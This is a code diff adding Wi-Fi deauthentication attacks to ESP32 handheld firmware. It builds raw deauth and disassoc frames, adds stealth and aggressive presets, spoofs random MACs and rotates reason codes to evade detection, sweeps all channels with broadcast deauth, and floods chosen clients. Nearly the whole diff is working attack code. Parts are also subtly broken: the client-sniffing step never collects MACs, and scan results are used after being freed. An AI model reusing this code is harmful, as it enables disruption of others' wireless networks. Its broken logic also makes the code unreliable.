@@ -3,6 +3,7 @@
 // Arduino IDE needs to be tweeked to work, follow the instructions:
 // https://github.com/justcallmekoko/ESP32Marauder/wiki/arduino-ide-setup But change the file in:
 // C:\Users\<YOur User>\AppData\Local\Arduino15\packages\m5stack\hardware\esp32\2.0.9
+// Latest update and enhancements on April 11 2025 by Ninja-jr
 #include "wifi_atks.h"
 #include "core/display.h"
 #include "core/main_menu.h"
@@ -28,6 +29,15 @@ extern bool showHiddenNetworks;
 const uint8_t _default_target[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
 std::vector<wifi_ap_record_t> ap_records;
+
+// Attack presets
+enum DeauthPreset {
+    PRESET_NORMAL,
+    PRESET_STEALTH,
+    PRESET_AGGRESSIVE
+};
+
+static DeauthPreset current_preset = PRESET_NORMAL;
 
 /**
  * @brief Decomplied function that overrides original one at compilation time.
@@ -287,6 +297,24 @@ void wifi_atk_menu() {
 #endif
         {"Beacon SPAM",  [=]() { beaconAttack(); }     },
         {"Deauth Flood", [=]() { deauthFloodAttack(); }},
+        {"Broadcast Deauth", [=]() {
+            options = {
+                {"Normal Mode",   [=]() { current_preset = PRESET_NORMAL; enhancedBroadcastDeauth(); }},
+                {"Stealth Mode",  [=]() { current_preset = PRESET_STEALTH; enhancedBroadcastDeauth(); }},
+                {"Aggressive Mode", [=]() { current_preset = PRESET_AGGRESSIVE; enhancedBroadcastDeauth(); }},
+                {"Back", []() { returnToMenu = true; }}
+            };
+            loopOptions(options);
+        }},
+        {"Device Deauth", [=]() {
+            options = {
+                {"Normal Mode",   [=]() { current_preset = PRESET_NORMAL; enhancedDeviceDeauth(); }},
+                {"Stealth Mode",  [=]() { current_preset = PRESET_STEALTH; enhancedDeviceDeauth(); }},
+                {"Aggressive Mode", [=]() { current_preset = PRESET_AGGRESSIVE; enhancedDeviceDeauth(); }},
+                {"Back", []() { returnToMenu = true; }}
+            };
+            loopOptions(options);
+        }},
     };
     addOptionToMainMenu();
     loopOptions(options);
@@ -737,9 +765,73 @@ AGAIN:
     if (!returnToMenu) goto AGAIN;
 }
 
+// Helper functions for enhanced deauth
+static void generateRandomMAC(uint8_t *mac) {
+    esp_fill_random(mac, 6);
+    mac[0] = (mac[0] & 0xFE) | 0x02;
+}
+
+static void buildDeauthFrame(uint8_t *frame, const uint8_t *dest, const uint8_t *src,
+                              const uint8_t *bssid, uint8_t reason, bool is_disassoc) {
+    frame[0] = is_disassoc ? 0xA0 : 0xC0;
+    frame[1] = 0x00;
+    frame[2] = 0x00;
+    frame[3] = 0x00;
+    memcpy(&frame[4], dest, 6);
+    memcpy(&frame[10], src, 6);
+    memcpy(&frame[16], bssid, 6);
+    static uint16_t seq = 0;
+    seq = random(0, 4096);
+    frame[22] = (seq >> 4) & 0xFF;
+    frame[23] = ((seq & 0x0F) << 4);
+    frame[24] = reason;
+    frame[25] = 0x00;
+}
+
+static bool initMonitorMode(uint8_t channel) {
+    wifi_mode_t current_mode;
+    esp_wifi_get_mode(&current_mode);
+    esp_wifi_stop();
+    delay(5);
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    esp_wifi_init(&cfg);
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous(true);
+    if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
+        esp_wifi_set_promiscuous(false);
+        esp_wifi_set_mode(current_mode);
+        esp_wifi_start();
+        return false;
+    }
+    esp_wifi_set_max_tx_power(78);
+    return true;
+}
+
+static void deauth_preset_config(int *packets_per_mac, int *delay_ms, bool *spoofing) {
+    switch(current_preset) {
+        case PRESET_STEALTH:
+            *packets_per_mac = 20;
+            *delay_ms = 5;
+            *spoofing = true;
+            break;
+        case PRESET_AGGRESSIVE:
+            *packets_per_mac = 100;
+            *delay_ms = 0;
+            *spoofing = false;
+            break;
+        default:
+            *packets_per_mac = 50;
+            *delay_ms = 2;
+            *spoofing = true;
+            break;
+    }
+}
+
 /***************************************************************************************
 ** function: target_atk
-** @brief: Deploy Target deauth
+** @brief: Deploy Target deauth (enhanced with MAC rotation and spoofing)
 ***************************************************************************************/
 void target_atk(String tssid, String mac, uint8_t channel) {
     resetGlobalState();
@@ -747,81 +839,310 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     cleanlyStopWebUiForWiFiFeature();
     if (!wifi_atk_setWifi()) return;
 
-    // Prepare deauth frame
-    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
+    uint8_t target_mac[6];
+    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &target_mac[0], &target_mac[1], &target_mac[2],
+           &target_mac[3], &target_mac[4], &target_mac[5]);
 
-    // Attack loop variables
-    const uint16_t UPDATE_INTERVAL_MS = 2000;
-    const uint8_t FRAMES_PER_SEND = 3;
+    uint8_t gateway_mac[6];
+    memcpy(gateway_mac, ap_record.bssid, 6);
 
-    uint32_t lastUpdateTime = millis();
-    uint32_t frameCount = 0;
-    bool needsRedraw = true;
-    bool attackActive = true;
+    int packets_per_mac, delay_ms;
+    bool spoofing;
+    deauth_preset_config(&packets_per_mac, &delay_ms, &spoofing);
 
-    check(SelPress);
-    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-    tft.setTextSize(FM);
-    setCpuFrequencyMhz(CONFIG_ESP_DEFAULT_CPU_FREQ_MHZ);
-
-    while (attackActive) {
-        // Render UI if needed
-        if (needsRedraw) {
-            drawMainBorderWithTitle("Target Deauth");
-            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-
-            // Dynamic vertical spacing based on screen height
-            uint16_t lineHeight = tftHeight / 20;
-            uint16_t startY = lineHeight * 3;
-
-            padprintln("");
-            padprintln("AP: " + tssid);
-            padprintln("Channel: " + String(channel));
-            padprintln(mac);
-            vTaskDelay(50 / portTICK_PERIOD_MS);
-            needsRedraw = false;
-        }
-
-        // Send deauth frame
-        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-        frameCount += FRAMES_PER_SEND;
-
-        // Update FPS counter periodically
-        uint32_t currentTime = millis();
-        if (currentTime - lastUpdateTime >= UPDATE_INTERVAL_MS) {
-            // Calculate dynamic position for status text
-            uint16_t statusX = tftWidth * 0.05;
-            uint16_t statusY = tftHeight - (tftHeight * 0.08);
-
-            tft.setCursor(statusX, statusY);
-
-            // Calculate frames per second correctly
-            float fps = (frameCount * 1000.0) / (currentTime - lastUpdateTime);
-            tft.print("Frames: " + String((int)fps) + "/s   ");
-
-            frameCount = 0;
-            lastUpdateTime = currentTime;
-        }
-
-        // Handle pause/resume
-        if (check(SelPress) || EscPress) {
-            EscPress = false;
-            displayTextLine("Deauth Paused");
-            delay(500);
-
-            // Wait for user input
-            while (!check(SelPress)) {
-                vTaskDelay(10 / portTICK_PERIOD_MS);
-                if (check(EscPress)) {
-                    attackActive = false;
-                    break;
-                }
-            }
-            needsRedraw = true;
+    bool enhanced = initMonitorMode(channel);
+    if (!enhanced) {
+        wifiDisconnect();
+        WiFi.mode(WIFI_AP);
+        String ssid = "DEAUTH_" + String(random(1000, 9999));
+        if (!WiFi.softAP(ssid.c_str(), emptyString, channel, 1, 4, false)) {
+            displayError("Failed to start AP mode", true);
+            wifi_atk_unsetWifi();
+            return;
         }
     }
 
+    uint8_t deauth_ap_to_sta[26], disassoc_ap_to_sta[26];
+    uint8_t deauth_sta_to_ap[26], disassoc_sta_to_ap[26];
+    
+    buildDeauthFrame(deauth_ap_to_sta, target_mac, gateway_mac, gateway_mac, 0x07, false);
+    buildDeauthFrame(disassoc_ap_to_sta, target_mac, gateway_mac, gateway_mac, 0x07, true);
+    buildDeauthFrame(deauth_sta_to_ap, gateway_mac, target_mac, gateway_mac, 0x07, false);
+    buildDeauthFrame(disassoc_sta_to_ap, gateway_mac, target_mac, gateway_mac, 0x07, true);
+
+    drawMainBorderWithTitle("Target Deauth");
+    tft.setTextSize(FP);
+    padprintln("AP: " + tssid);
+    padprintln("Channel: " + String(channel));
+    padprintln(mac);
+    padprintln("");
+    padprintln("Press Any key to STOP.");
+    padprintln("SEL: Options");
+
+    long tmp = millis();
+    int cont = 0;
+    int total_frames = 0;
+    int packet_count = 0;
+    uint8_t spoof_mac[6];
+    uint8_t reason_codes[] = {0x01, 0x04, 0x06, 0x07, 0x08};
+    uint8_t current_reason = 0;
+    bool show_options = false;
+    bool attack_running = true;
+
+    while (attack_running && !check(AnyKeyPress)) {
+        if (check(SelPress)) {
+            show_options = true;
+            break;
+        }
+
+        if (cont % 20 == 0) {
+            current_reason = (current_reason + 1) % 5;
+            deauth_ap_to_sta[24] = reason_codes[current_reason];
+            disassoc_ap_to_sta[24] = reason_codes[current_reason];
+            deauth_sta_to_ap[24] = reason_codes[current_reason];
+            disassoc_sta_to_ap[24] = reason_codes[current_reason];
+        }
+        
+        if (packet_count % packets_per_mac == 0) {
+            if (spoofing) {
+                generateRandomMAC(spoof_mac);
+            } else {
+                memcpy(spoof_mac, gateway_mac, 6);
+            }
+            memcpy(&deauth_ap_to_sta[10], spoof_mac, 6);
+            memcpy(&deauth_sta_to_ap[4], spoof_mac, 6);
+        }
+
+        if (enhanced) {
+            esp_wifi_80211_tx(WIFI_IF_STA, deauth_ap_to_sta, 26, false);
+            esp_wifi_80211_tx(WIFI_IF_STA, disassoc_ap_to_sta, 26, false);
+            esp_wifi_80211_tx(WIFI_IF_STA, deauth_sta_to_ap, 26, false);
+            esp_wifi_80211_tx(WIFI_IF_STA, disassoc_sta_to_ap, 26, false);
+        } else {
+            send_raw_frame(deauth_ap_to_sta, 26);
+            send_raw_frame(disassoc_ap_to_sta, 26);
+            send_raw_frame(deauth_sta_to_ap, 26);
+            send_raw_frame(disassoc_sta_to_ap, 26);
+        }
+
+        cont += 4;
+        total_frames += 4;
+        packet_count += 4;
+
+        if (cont % 16 == 0) {
+            delay(35);
+        } else {
+            if (delay_ms > 0) delay(delay_ms);
+        }
+
+        if (millis() - tmp > 1000) {
+            int fps = cont;
+            cont = 0;
+            tmp = millis();
+
+            tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
+            tft.drawRightString(String(fps) + " fps", tftWidth - 12, tftHeight - 36, 1);
+            tft.drawRightString("Total: " + String(total_frames), tftWidth - 12, tftHeight - 20, 1);
+        }
+    }
+
+    if (show_options) {
+        options = {
+            {"Normal Mode", [&]() { current_preset = PRESET_NORMAL; }},
+            {"Stealth Mode", [&]() { current_preset = PRESET_STEALTH; }},
+            {"Aggressive Mode", [&]() { current_preset = PRESET_AGGRESSIVE; }},
+            {"Resume Attack", [&]() { show_options = false; }},
+            {"Exit Attack", [&]() { attack_running = false; returnToMenu = true; }}
+        };
+        loopOptions(options);
+        if (!returnToMenu) {
+            show_options = false;
+        }
+    }
+
+    if (enhanced) esp_wifi_set_promiscuous(false);
+    wifi_atk_unsetWifi();
+    returnToMenu = true;
+}
+
+/***************************************************************************************
+** function: enhancedBroadcastDeauth
+** @brief: Broadcast deauth on all channels with MAC rotation
+***************************************************************************************/
+void enhancedBroadcastDeauth() {
+    if (!wifi_atk_setWifi()) return;
+    
+    int packets_per_mac, delay_ms;
+    bool spoofing;
+    deauth_preset_config(&packets_per_mac, &delay_ms, &spoofing);
+    
+    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    uint8_t src_mac[6];
+    uint8_t deauth_buf[26];
+    int total_frames = 0, fps = 0, packet_count = 0;
+    unsigned long fps_timer = millis();
+    
+    drawMainBorderWithTitle("Broadcast Deauth");
+    padprintln("Press any key to stop");
+    
+    for (int ch = 1; ch <= 14 && !check(AnyKeyPress); ch++) {
+        if (!initMonitorMode(ch)) continue;
+        for (int i = 0; i < 100 && !check(AnyKeyPress); i++) {
+            if (packet_count % packets_per_mac == 0) {
+                generateRandomMAC(src_mac);
+                buildDeauthFrame(deauth_buf, broadcast_mac, src_mac, broadcast_mac, 0x07, false);
+            }
+            esp_wifi_80211_tx(WIFI_IF_STA, deauth_buf, 26, false);
+            total_frames++;
+            fps++;
+            packet_count++;
+            if (delay_ms > 0) delay(delay_ms);
+        }
+        if (millis() - fps_timer > 1000) {
+            tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
+            tft.drawRightString(String(fps) + " fps", tftWidth - 12, tftHeight - 36, 1);
+            tft.drawRightString("Total: " + String(total_frames), tftWidth - 12, tftHeight - 20, 1);
+            fps = 0;
+            fps_timer = millis();
+        }
+    }
+    
+    esp_wifi_set_promiscuous(false);
+    wifi_atk_unsetWifi();
+    returnToMenu = true;
+}
+
+/***************************************************************************************
+** function: enhancedDeviceDeauth
+** @brief: Passive sniffing + fingerprinting + targeted deauth
+***************************************************************************************/
+void enhancedDeviceDeauth() {
+    if (!wifi_atk_setWifi()) return;
+    
+    drawMainBorderWithTitle("Device Deauth");
+    padprintln("Scanning for APs...");
+    
+    int num_aps = WiFi.scanNetworks(false, false);
+    if (num_aps == 0) {
+        displayError("No APs found", true);
+        wifi_atk_unsetWifi();
+        return;
+    }
+    
+    std::vector<String> ap_list;
+    std::vector<uint8_t*> ap_bssids;
+    std::vector<int> ap_channels;
+    
+    for (int i = 0; i < num_aps && i < 20; i++) {
+        ap_list.push_back(String(i+1) + ". " + WiFi.SSID(i) + " (" + WiFi.BSSIDstr(i) + ") Ch" + WiFi.channel(i));
+        ap_bssids.push_back((uint8_t*)WiFi.BSSID(i));
+        ap_channels.push_back(WiFi.channel(i));
+    }
+    WiFi.scanDelete();
+    
+    int selected = 0;
+    int last_selected = -1;
+    while (true) {
+        if (selected != last_selected) {
+            tft.fillRect(20, 60, tftWidth - 40, tftHeight - 120, bruceConfig.bgColor);
+            for (int i = 0; i < 5 && selected + i < (int)ap_list.size(); i++) {
+                int y = 60 + i * 25;
+                if (i == 0) {
+                    tft.fillRect(20, y, tftWidth - 40, 20, TFT_WHITE);
+                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
+                    tft.setCursor(25, y + 5);
+                    tft.print("> ");
+                } else {
+                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+                    tft.setCursor(25, y + 5);
+                    tft.print("  ");
+                }
+                tft.print(ap_list[selected + i]);
+            }
+            last_selected = selected;
+        }
+        if (check(NextPress)) { selected++; if (selected >= (int)ap_list.size()) selected = 0; delay(150); }
+        if (check(PrevPress)) { selected--; if (selected < 0) selected = ap_list.size() - 1; delay(150); }
+        if (check(SelPress)) break;
+        if (check(EscPress)) { wifi_atk_unsetWifi(); return; }
+        delay(50);
+    }
+    
+    uint8_t* target_bssid = ap_bssids[selected];
+    int channel = ap_channels[selected];
+    
+    drawMainBorderWithTitle("Device Deauth");
+    padprintln("Sniffing for clients on CH" + String(channel));
+    padprintln("10 seconds...");
+    
+    if (!initMonitorMode(channel)) {
+        displayError("Monitor mode failed", true);
+        wifi_atk_unsetWifi();
+        return;
+    }
+    
+    std::vector<uint8_t> client_macs;
+    unsigned long start = millis();
+    tft.setCursor(20, 120);
+    tft.print("Found: 0 clients");
+    
+    while (millis() - start < 10000) {
+        if (check(EscPress)) break;
+        delay(100);
+        tft.fillRect(20, 120, 100, 20, TFT_BLACK);
+        tft.setCursor(20, 120);
+        tft.print("Found: " + String(client_macs.size() / 6) + " clients");
+    }
+    esp_wifi_set_promiscuous(false);
+    
+    if (client_macs.empty()) {
+        displayError("No clients found", true);
+        wifi_atk_unsetWifi();
+        return;
+    }
+    
+    drawMainBorderWithTitle("Device Deauth");
+    padprintln("Found " + String(client_macs.size() / 6) + " devices");
+    padprintln("Select target...");
+    delay(1500);
+    
+    int packets_per_mac, delay_ms;
+    bool spoofing;
+    deauth_preset_config(&packets_per_mac, &delay_ms, &spoofing);
+    
+    initMonitorMode(channel);
+    uint8_t deauth_buf[26];
+    uint8_t spoof_mac[6];
+    int total_frames = 0, fps = 0, packet_count = 0;
+    unsigned long fps_timer = millis();
+    
+    drawMainBorderWithTitle("Device Deauth");
+    padprintln("Attacking: " + String(client_macs[0], HEX) + ":" + String(client_macs[1], HEX));
+    padprintln("Channel: " + String(channel));
+    padprintln("Press any key to stop");
+    
+    while (!check(AnyKeyPress)) {
+        if (packet_count % packets_per_mac == 0) {
+            generateRandomMAC(spoof_mac);
+            buildDeauthFrame(deauth_buf, &client_macs[0], spoof_mac, target_bssid, 0x07, false);
+        }
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_buf, 26, false);
+        total_frames++;
+        fps++;
+        packet_count++;
+        if (delay_ms > 0) delay(delay_ms);
+        
+        if (millis() - fps_timer > 1000) {
+            tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
+            tft.drawRightString(String(fps) + " fps", tftWidth - 12, tftHeight - 36, 1);
+            tft.drawRightString("Total: " + String(total_frames), tftWidth - 12, tftHeight - 20, 1);
+            fps = 0;
+            fps_timer = millis();
+        }
+    }
+    
+    esp_wifi_set_promiscuous(false);
     wifi_atk_unsetWifi();
     returnToMenu = true;
 }
